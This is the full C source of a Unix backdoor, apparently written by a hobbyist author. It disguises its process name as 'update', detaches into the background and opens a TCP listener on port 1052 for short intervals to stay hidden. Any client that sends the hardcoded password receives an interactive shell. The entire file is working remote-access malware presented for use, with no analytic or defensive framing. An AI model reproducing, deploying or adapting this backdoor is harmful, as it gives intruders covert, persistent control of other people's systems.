/*                                             code by aion (aion@ukr.net) 
 ****************************************************************************/

#define PORT  	  1052
#define PASS  	  "aion1981"   
#define SLEEPTIME 300          // sleep  5 min.
#define UPTIME    10           // listen 10 sec.
#define PSNAME    "update   "  // what copy to argv[0]

#include <stdio.h>
#include <signal.h>        
#include <string.h>        
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/wait.h>      
#include <netinet/in.h> 
#include <fcntl.h>	   
#include <time.h>           

time_t stimer; int retval;
char temp_buff[11];
int soc_des, soc_cli, soc_rc;
struct sockaddr_in serv_addr; 
struct sockaddr_in client_addr;

closeall()
{
  close(soc_cli);      close(soc_des);       // port is still listen
  shutdown(soc_cli,0); shutdown(soc_des,0);  // if don't close/shutdown all !
}

main (int argc,char **argv) 
{ 
    for(retval=0;argv[0][retval]!=0;retval++) argv[0][retval]=0; 
    strcpy(argv[0],PSNAME);
    setpgrp(); signal(SIGHUP, SIG_IGN); if (fork() != 0) exit(0); 

    // this is needed to check if port already open (in loop we don't check it)
    if( (soc_des = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) == -1) exit(-1); 
    bzero((char *) &serv_addr, sizeof(serv_addr));
    serv_addr.sin_family = AF_INET; 
    serv_addr.sin_addr.s_addr = htonl(INADDR_ANY);
    serv_addr.sin_port = htons(PORT);
    if( (soc_rc = bind(soc_des, 
        (struct sockaddr *) &serv_addr, sizeof(serv_addr))) != 0) exit(-1); 
    if( (soc_rc=listen(soc_des, 5)) != 0) exit(0); 

    while (1) { 
        fcntl(soc_cli, F_SETFL, O_NONBLOCK); 
        fcntl(soc_des, F_SETFL, O_NONBLOCK); 
        
	for(stimer=time(NULL);(stimer+UPTIME)>time(NULL);)
	{
	  soc_cli = accept(soc_des, 
	              (struct sockaddr *) &client_addr, sizeof(client_addr));
          if (soc_cli > 0) 
	  {
            if (!fork()) { 
                dup2(soc_cli,0); 
                dup2(soc_cli,1); 
                dup2(soc_cli,2);
   	        read(soc_cli,temp_buff,10);
	        if( !strncmp(temp_buff,PASS,strlen(PASS)) )
                  execl("/bin/sh","sh -i",(char *)0); 
                closeall(); 
                exit(0); 
            } else wait(&retval); 
	  }
	  sleep(1);
	}                                   

        closeall(); 
	sleep(SLEEPTIME);

	// bind port can change if don't call all this again
        soc_des = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
        bzero((char *) &serv_addr, sizeof(serv_addr));
        serv_addr.sin_family = AF_INET; 
        serv_addr.sin_addr.s_addr = htonl(INADDR_ANY);
        serv_addr.sin_port = htons(PORT);
        soc_rc = bind(soc_des,(struct sockaddr *)&serv_addr,sizeof(serv_addr));
        soc_rc=listen(soc_des, 5);
    }
}
